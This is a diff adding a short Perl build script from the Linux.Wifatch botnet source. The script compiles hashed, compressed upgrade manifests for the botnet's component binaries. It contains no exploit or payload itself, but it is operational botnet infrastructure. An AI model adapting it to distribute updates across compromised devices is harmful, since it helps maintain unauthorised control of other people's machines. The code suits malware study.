@@ -1,0 +1,59 @@
+#!/usr/bin/env perl
+#
+# This file is part of Linux.Wifatch
+#
+# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
+#
+# Linux.Wifatch is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# Linux.Wifatch is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
+#
+
+# build !whisper data, for upgrades
+
+use strict;
+use Digest::SHA;
+use CBOR::XS;
+
+my $version = shift;
+my $arch    = shift;
+
+my %whisper;
+
+$whisper{plversion} = $version;
+$whisper{bnversion} = $arch;
+
+#$whisper{minbnversion} = 24;
+$whisper{skipbn} = 1;    # never got around to make automated bn upgrades
+
+for (   [bn => "botnet"],
+
+	#	[zm       => "zmap"],
+	#	[dbclient => "dc"],
+	[rf => "rf"],
+	[dl => "dl"],
+	[tn => "tn"],
+	) {
+	my ($bn, $botnet) = @$_;
+
+	for my $path (<arch/*/$botnet>) {
+		my $sha = new Digest::SHA "sha256";
+		$sha->addfile($path);
+		my $size = -s $path;
+		$path =~ s%/\Q$botnet%/$bn%;
+		$path =~ s%^arch/%%;
+		$whisper{file}{$path} = [$size, $sha->digest];
+	}
+}
+
+syswrite STDOUT, Compress::LZF::compress_best encode_cbor \%whisper;
+
